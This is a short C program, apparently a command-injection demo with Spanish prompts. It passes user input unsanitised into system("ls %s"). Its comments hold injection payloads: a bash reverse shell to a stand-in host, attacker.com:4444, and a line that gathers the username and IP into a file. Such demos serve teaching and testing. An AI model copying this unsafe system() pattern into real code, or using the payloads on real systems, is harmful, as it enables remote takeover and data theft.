#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char input[200];
    char command[300];


    printf("Ingresa el nombre de un archivo: ");
    fgets(input, sizeof(input), stdin);

    input[strcspn(input, "\n")] = 0;

    // Parece seguro porque siempre usa "ls"
    // ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
    // ; echo "USER: $(whoami)" > secrets.txt; echo "IP: $(ipconfig getifaddr en0)" >> secrets.txt; echo "DATE: $(date)" >> secrets.txt
    sprintf(command, "ls %s", input);

    printf("Ejecutando: %s\n", command);
    system(command);

    return 0;
}
